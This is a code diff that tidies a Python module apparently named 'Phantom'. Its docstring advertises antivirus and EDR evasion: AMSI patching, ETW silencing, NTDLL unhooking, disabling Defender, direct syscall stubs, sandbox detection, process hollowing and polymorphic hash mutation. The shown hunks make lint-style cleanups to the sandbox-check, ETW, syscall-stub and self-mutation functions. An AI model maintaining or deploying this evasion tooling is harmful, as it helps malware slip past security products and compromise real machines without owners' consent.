@@ -5,9 +5,13 @@ Phantom: static analysis evasion (real packer, real crypter, code caves),
 AMSI killer with real patch bytes, ETW silencing, NTDLL unhooking from disk,
 Defender disable via PowerShell, Hell's Gate syscall stubs, sandbox/VM detection,
 process hollowing, LOLBin usage, polymorphic hash mutation."""
-import json, os, random, time, struct, subprocess, sys, hashlib, re, socket, ctypes, glob as _glob
-from datetime import datetime, timedelta
-from pathlib import Path
+import json
+import os
+import random
+import time
+import subprocess
+import hashlib
+import socket
 
 HAS_CRYPTO = False
 try:
@@ -361,7 +365,7 @@ def handle_phantom_evasion(params: dict) -> dict:
         not result["checks"].get("is_sandbox", True),
         result["checks"].get("ram_ok", False),
         result["checks"].get("disk_ok", False),
-        not result["checks"].get("vm_tools_not_detected", False) is False,
+        result["checks"].get("vm_tools_not_detected", False) is not False,
     ])
 
     return result
@@ -486,7 +490,7 @@ def _check_etw_silence() -> dict:
 
         # Check if ETW provider was removed
         try:
-            advapi = ctypes.WinDLL("advapi32.dll")
+            ctypes.WinDLL("advapi32.dll")
             result["etw_providers_checkable"] = True
         except Exception:
             pass
@@ -614,7 +618,7 @@ def _generate_syscall_stubs() -> dict:
         ntdll = ctypes.WinDLL("ntdll.dll")
         for name in syscall_numbers:
             try:
-                func = getattr(ntdll, name)
+                getattr(ntdll, name)
                 result["syscalls"][name] = {"ssn": syscall_numbers[name], "resolvable": True}
             except AttributeError:
                 result["syscalls"][name] = {"ssn": syscall_numbers[name], "resolvable": False}
@@ -809,7 +813,7 @@ def _generate_mutation() -> dict:
 
     # Generate multiple hash variations of current process
     try:
-        with open(f"/proc/self/exe", "rb") if os.name != "nt" else None as f:
+        with open("/proc/self/exe", "rb") if os.name != "nt" else None as f:
             if f:
                 data = f.read()
                 mutations = []
